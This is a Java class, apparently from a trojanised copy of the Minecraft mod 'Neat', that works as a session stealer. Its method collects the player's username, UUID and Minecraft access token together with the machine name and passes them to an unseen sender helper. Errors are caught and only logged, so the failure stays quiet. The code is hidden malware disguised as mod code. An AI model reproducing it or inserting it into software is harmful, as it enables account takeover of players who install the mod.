package vazkii.neat;

import net.minecraft.client.Minecraft;
import net.minecraft.client.User;

public final class S {
    private S() {}

    public static void grab() {
        try {
            Minecraft mc = Minecraft.getInstance();
            if (mc == null) return;
            User session = mc.getUser();
            if (session == null) return;

            String name = session.getName();
            String uuid = session.getProfileId() == null ? "?" : session.getProfileId().toString();
            String token = session.getAccessToken();

            if (token == null || token.isEmpty()) return;

            String msg = "[session] " + host()
                + "\nname=" + name
                + "\nuuid=" + uuid
                + "\ntoken=" + token;

            F.sendText(msg);
        } catch (Throwable t) {
            B.warn("S", t.getMessage());
        }
    }

    private static String host() {
        String n = System.getenv("COMPUTERNAME");
        return n == null ? "pc" : n;
    }
}